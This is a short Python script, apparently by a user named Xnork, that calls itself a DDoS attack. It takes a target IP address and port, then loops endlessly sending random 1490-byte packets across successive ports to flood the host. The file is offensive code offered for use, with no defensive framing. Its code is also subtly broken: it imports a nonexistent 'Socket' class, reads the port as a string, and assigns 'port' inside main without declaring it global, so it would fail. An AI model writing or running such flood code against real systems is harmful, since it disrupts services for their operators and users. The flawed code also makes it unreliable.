# author: Xnork
# data: 18/11/2022

import random
from Socket import Socket

IP_TARGET, port \
    = input('IP Target: '), \
      input('Initial port: ') or 90

assert len(IP_TARGET) > 0

target = Socket(IP_TARGET)
BYTES = random._urandom(1490)

def main():
    print('DDoS Attack is working...')
    while True:
        try:
            target.send_to(port, BYTES)
            port = port + 1 if port < 65534 else 1
        except:
            print('\nDDoS Attack has closed.')
            target.close()
            break

if __name__ == '__main__':
    main()
